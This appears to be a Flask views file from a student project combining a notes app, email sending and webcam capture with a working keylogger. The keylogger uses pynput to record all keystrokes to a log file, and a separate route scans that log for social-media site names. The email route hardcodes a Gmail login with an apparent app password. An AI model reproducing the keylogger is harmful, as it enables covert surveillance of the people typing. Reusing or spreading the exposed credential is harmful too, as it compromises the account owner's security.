from email.message import EmailMessage
from flask import Blueprint, Response, redirect, render_template, request, flash, jsonify, url_for
from flask_login import login_required, current_user
from .models import Note
from . import db
import json
from flask_mail import *
import smtplib
from pynput.keyboard import Listener
import cv2
import datetime, time
import os, sys
import numpy as np
from threading import Thread
from flask import request
from werkzeug.utils import secure_filename


views = Blueprint('views', __name__)


@views.route('/', methods=['GET', 'POST'])
@login_required
def home():
    if request.method == 'POST': 
        note = request.form.get('note')#Gets the note from the HTML 

        if len(note) < 1:
            flash('Note is too short!', category='error') 
        else:
            new_note = Note(data=note, user_id=current_user.id)  #providing the schema for the note 
            db.session.add(new_note) #adding the note to the database 
            db.session.commit()
            flash('Note added!', category='success')

    return render_template("home.html", user=current_user)


@views.route('/delete-note', methods=['POST'])
def delete_note():  
    note = json.loads(request.data) # this function expects a JSON from the INDEX.js file 
    noteId = note['noteId']
    note = Note.query.get(noteId)
    if note:
        if note.user_id == current_user.id:
            db.session.delete(note)
            db.session.commit()

@views.route('/send_email', methods = ['GET', 'POST'])
@login_required
def send_email():
    if request.method == 'POST':
        email = request.form.get('email')
        text = request.form.get('message')
        subject = request.form.get('subject')
        message = 'Subject: {}\n\n{}'.format(subject,text)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login("instantjob0@gmail.com", "cwmtrjmmnlhmfnez")
        server.sendmail("instantjob0@gmail.com", email , message)
     
    return render_template("send_email.html", user=current_user)

# File path for the log file
LOG_FILE_PATH = 'log.txt'

# Function to remove the last letter from the file
def remove_last_letter_from_file(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
    if content:
        with open(file_path, 'w') as f:
            f.write(content[:-1])


# Keylogger function
def key_logger(key):
    letter = str(key).replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.backspace":
        # Call the function to remove the last letter from the file
        remove_last_letter_from_file(LOG_FILE_PATH)
        return  # Skip writing to the file for backspace
    elif letter == "Key.cmdw":
        letter = 'Tab closed'

    with open(LOG_FILE_PATH, 'a') as f:
        f.write(letter)

# Route to start the keylogger
@views.route('/start_keylogger', methods=['GET','POST'])
def start_keylogger():  
    with Listener(on_press=key_logger) as listener:
        listener.join()
    return redirect(url_for('views.key_logger_page'))

# Route to clear the file
@views.route('/clear_file', methods=['POST'])
def clear_file():
    open(LOG_FILE_PATH, 'w').close()  # Clear the file by opening it in write mode
    flash("File cleared successfully!", category='success')
    return redirect(url_for('views.key_logger_page'))

# Route to find social media platforms
@views.route('/find_social_media_platforms', methods=['POST'])
def find_social_media_platforms():
    try:
        social_media_platforms = ["facebook", "twitter", "instagram", "netflix", "snapchat", "youtube", "amazon"]
        found_platforms = []

        with open(LOG_FILE_PATH, 'r') as file:
            for line in file:
                name = line.strip().lower()
                if name in social_media_platforms:
                    found_platforms.append(name)

        flash(f"Found social media platforms: {', '.join(found_platforms)}", category='info')
    except Exception as e:
        flash(f"An error occurred: {e}", category='error')
    return redirect(url_for('views.key_logger_page'))

# Route to render the key logger page
@views.route('/key_logger_page')
def key_logger_page():
    return render_template('key_logger.html')

#-----------------------------------------------------------------------------------------------------------------------------------
import os
import datetime
from flask import render_template, request, redirect, url_for, Response
from flask_login import login_required, current_user
from threading import Thread
import cv2
import torch
from PIL import Image, ImageTk
import tkinter as tk

# Global variables for webcam and recording
switch = 0
camera = None
out = None
rec = False
capture = 0

# Global variable for screenshot directory
screenshot_dir = None

# Global variable for YOLOv5 model
model = None

# Global variable for capturing screenshots
screenshot_counter = 0
def initialize_yolov5(weights_path, config_path):
    try:
        # Load the YOLOv5 model
        model = torch.hub.load('/Users/manumaddi/NEA Final/mymodel', 'custom', path=weights_path, source='local', )
        return model
    except Exception as e:
        print(f"Error initializing YOLOv5: {e}")
        return None


# Update the select_screenshot_folder function
@views.route('/select_screenshot_folder', methods=['POST'])
@login_required
def select_screenshot_folder():
    global screenshot_dir
    # Get the selected screenshot directory from the form
    selected_dir = request.form.get('screenshot_dir')
    
    # Check if selected_dir is None or empty
    if selected_dir and os.path.isdir(selected_dir):
        screenshot_dir = selected_dir
        print(f"Screenshot directory selected: {screenshot_dir}")
    else:
        # If the directory does not exist or is not selected, render the template with an error message
        error_message = "Selected directory is invalid or empty!"
        return render_template("webcam.html", user=current_user, error_message=error_message)
    
    return redirect(url_for('views.webcam'))

# Update the toggle_recording function
def toggle_recording():
    global rec, out
    rec = not rec
    if rec:
        now = datetime.datetime.now()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(f"vid_{now}.avi", fourcc, 20.0, (640, 480))
        # Start new thread for recording the video
        thread = Thread(target=record_video, args=[out])
        thread.start()
        print("Recording started.")
    else:
        out.release()
        print("Recording stopped.")


# Function to record video
def record_video(out):
    global rec, camera
    while rec:
        ret, frame = camera.read()
        if ret:
            out.write(frame)

# Function to start the webcam
def start_webcam():
    global camera
    camera = cv2.VideoCapture(0)
    # Start new thread for updating frames
    thread = Thread(target=update_frames)
    thread.start()

# Function to update frames
def update_frames():
    global camera
    while True:
        ret, frame = camera.read()
        if ret:
            # Convert frame to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            # Display the frame in tkinter window
            img = ImageTk.PhotoImage(Image.fromarray(frame_rgb))
            #canvas.create_image(0, 0, anchor=tk.NW, image=img)
            #canvas.image = img

# Function to stop the webcam and close tkinter window
def stop_webcam():
    global camera, root
    if camera:
        camera.release()
    root.destroy()

# Route for video feed
@views.route('/video_feed', methods=['GET', 'POST'])
@login_required
def video_feed():
    return render_template('webcam.html', user=current_user)

@views.route('/capture', methods=['POST'])
@login_required
def capture():
    global camera, screenshot_dir, screenshot_counter
    
    # Check if the camera is active
    if camera is not None:
        ret, frame = camera.read()
        if ret:
            screenshot_counter += 1
            filename = f"ss_{screenshot_counter}.jpg"
            filepath = os.path.join(screenshot_dir, filename)
            cv2.imwrite(filepath, frame)
            print("Screenshot Captured")
    
    # Redirect back to the webcam page
    return redirect(url_for('views.webcam'))

# Modify the 'webcam' route to handle POST requests from the capture button
@views.route('/webcam', methods=['GET', 'POST'])
@login_required
def webcam():
    global switch, camera, out, rec, screenshot_dir

    if request.method == 'POST':
        if request.form.get('toggle_webcam'):
            if switch == 1:
                stop_webcam()
                switch = 0
            else:
                start_webcam()
                switch = 1
        elif request.form.get('click'):  # Capture button clicked
            return capture()  # Call the 'capture' function
    
    return render_template('webcam.html', user=current_user)



# Initialize YOLOv5 model
weights_path = 'instance/best.pt'
config_path = 'instance/data.yaml'
initialize_yolov5(weights_path, config_path)

